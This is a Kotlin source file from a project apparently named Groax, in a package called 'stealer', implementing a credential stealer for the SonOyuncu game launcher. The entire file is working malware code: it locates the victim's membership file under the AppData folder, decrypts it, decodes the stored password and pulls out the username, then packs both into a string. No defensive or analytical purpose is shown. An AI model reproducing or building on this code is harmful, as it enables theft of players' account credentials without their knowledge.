package io.groax.impl.stealer

import com.google.common.base.Objects
import com.google.gson.JsonObject
import io.groax.api.stealer.Stealer
import io.groax.impl.Utilities
import java.io.File

/**
 * @author Groax
 */
class SonOyuncu : Stealer
{
    //We need parse first.
    override var encryptedLocation: File = File(System.getenv("appdata"), ".sonoyuncu" + File.separator + "sonoyuncu-membership.json")

    override var encryptedJson: JsonObject = parser.parse(Utilities.decryptBitwise(encryptedLocation)).asJsonObject

    override fun getPassword(): String {
        return Utilities.decryptBase64(encryptedJson.get("sonOyuncuPassword").asString)
    }

    override fun getUsername(): String {
        return encryptedJson.get("sonOyuncuUsername").asString
    }

    override fun toString(): String {
        return Objects.toStringHelper(this).add("Username", this.getUsername()).add("Password", this.getPassword()).toString()
    }
}